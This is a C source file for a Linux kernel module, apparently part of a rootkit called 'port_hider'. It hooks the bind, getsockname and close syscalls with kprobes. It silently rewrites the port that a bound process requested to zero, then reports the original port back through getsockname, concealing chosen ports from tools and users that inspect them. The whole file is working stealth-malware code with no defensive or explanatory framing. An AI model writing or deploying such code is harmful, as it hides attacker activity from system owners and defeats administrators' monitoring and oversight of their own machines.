#include "port_hider.h"

static bool rp_bind_ok;
static bool rp_gsn_ok;
static bool kp_close_ok;
static bool close_fd_is_first_arg;

struct bind_data {
    unsigned int fd;
    u16 orig_port;
};

#define GSN_DATA_LEN (sizeof(struct sockaddr __user *) + sizeof(unsigned int))

/* bind */

static int h_bind_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct sockaddr __user *uaddr = (void __user *)regs->regs[1];
    int addrlen = (int)regs->regs[2];
    struct sockaddr_storage kaddr;
    u16 port;
    struct bind_data *bd = (struct bind_data *)ri->data;

    bd->orig_port = 0;

    if (!uaddr || addrlen <= 0)
        return 0;

    pagefault_disable();
    if (__copy_from_user_inatomic(&kaddr, uaddr, min_t(int, addrlen, sizeof(kaddr)))) {
        pagefault_enable();
        return 0;
    }
    pagefault_enable();

    if (kaddr.ss_family == AF_INET) {
        if (addrlen < offsetof(struct sockaddr_in, sin_port) + sizeof(port))
            return 0;
        port = ((struct sockaddr_in *)&kaddr)->sin_port;
    } else if (kaddr.ss_family == AF_INET6) {
        if (addrlen < offsetof(struct sockaddr_in6, sin6_port) + sizeof(port))
            return 0;
        port = ((struct sockaddr_in6 *)&kaddr)->sin6_port;
    } else {
        return 0;
    }

    if (!is_hidden_port(port) || is_allowed_task())
        return 0;

    bd->fd = regs->regs[0];
    bd->orig_port = port;

    {
        u16 zero_port = 0;
        unsigned int port_off = (kaddr.ss_family == AF_INET)
            ? offsetof(struct sockaddr_in, sin_port)
            : offsetof(struct sockaddr_in6, sin6_port);

        pagefault_disable();
        __copy_to_user_inatomic((u8 __user *)uaddr + port_off, &zero_port, sizeof(zero_port));
        pagefault_enable();
    }

    return 0;
}

static int h_bind_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct bind_data *bd = (struct bind_data *)ri->data;

    if ((long)regs->regs[0] != 0)
        return 0;
    if (bd->orig_port)
        fd_add(current->tgid, bd->fd, bd->orig_port);
    return 0;
}

static struct kretprobe rp_bind = {
    .entry_handler = h_bind_entry,
    .handler       = h_bind_ret,
    .data_size     = sizeof(struct bind_data),
    .maxactive     = 64,
};

int setup_bind(void)
{
    unsigned long a = find_sys("bind");
    if (!a) { pr_dbg("__sys_bind not found\n"); return -ENOENT; }
    rp_bind.kp.addr = (void *)a;
    if (register_kretprobe(&rp_bind)) {
        pr_dbg("cannot kretprobe __sys_bind\n");
        return -EINVAL;
    }
    rp_bind_ok = true;
    pr_dbg("kretprobe __sys_bind @ 0x%lx\n", a);
    return 0;
}

void cleanup_bind(void)
{
    if (rp_bind_ok) { unregister_kretprobe(&rp_bind); rp_bind_ok = false; }
}

/* getsockname */

static int h_gsn_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    *(struct sockaddr __user **)ri->data = (void __user *)regs->regs[1];
    *(unsigned int *)(ri->data + sizeof(struct sockaddr __user *)) = regs->regs[0];
    return 0;
}

static int h_gsn_ret(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct sockaddr __user *uaddr;
    unsigned int fd;
    u16 orig_port;

    if ((long)regs->regs[0] != 0)
        return 0;

    uaddr = *(struct sockaddr __user **)ri->data;
    fd    = *(unsigned int *)(ri->data + sizeof(struct sockaddr __user *));

    if (!uaddr || !fd_get(current->tgid, fd, &orig_port))
        return 0;

    pagefault_disable();
    __copy_to_user_inatomic((u8 __user *)uaddr + 2, &orig_port, sizeof(orig_port));
    pagefault_enable();
    return 0;
}

static struct kretprobe rp_gsn = {
    .entry_handler = h_gsn_entry,
    .handler       = h_gsn_ret,
    .data_size     = GSN_DATA_LEN,
    .maxactive     = 64,
};

int setup_gsn(void)
{
    unsigned long a = find_sys("getsockname");
    if (!a) { pr_dbg("__sys_getsockname not found\n"); return -ENOENT; }
    rp_gsn.kp.addr = (void *)a;
    if (register_kretprobe(&rp_gsn)) {
        pr_dbg("cannot kretprobe __sys_getsockname\n");
        return -EINVAL;
    }
    rp_gsn_ok = true;
    pr_dbg("kretprobe __sys_getsockname @ 0x%lx\n", a);
    return 0;
}

void cleanup_gsn(void)
{
    if (rp_gsn_ok) { unregister_kretprobe(&rp_gsn); rp_gsn_ok = false; }
}

/* close */

static int h_close_pre(struct kprobe *p, struct pt_regs *regs)
{
    unsigned int fd = close_fd_is_first_arg ? regs->regs[0] : regs->regs[1];
    fd_del(current->tgid, fd);
    return 0;
}

static struct kprobe kp_close = {
    .pre_handler = h_close_pre,
};

int setup_close(void)
{
    unsigned long a;

    a = find_sym("__close_fd");
    if (a) {
        close_fd_is_first_arg = false;
    } else {
        a = find_sym("close_fd");
        if (!a) a = find_sys("close");
        close_fd_is_first_arg = true;
    }
    if (!a) { pr_dbg("no close symbol found\n"); return -ENOENT; }
    kp_close.addr = (void *)a;
    if (register_kprobe(&kp_close)) {
        pr_dbg("cannot kprobe close\n");
        return -EINVAL;
    }
    kp_close_ok = true;
    pr_dbg("kprobe close @ 0x%lx\n", a);
    return 0;
}

void cleanup_close(void)
{
    if (kp_close_ok) { unregister_kprobe(&kp_close); kp_close_ok = false; }
}
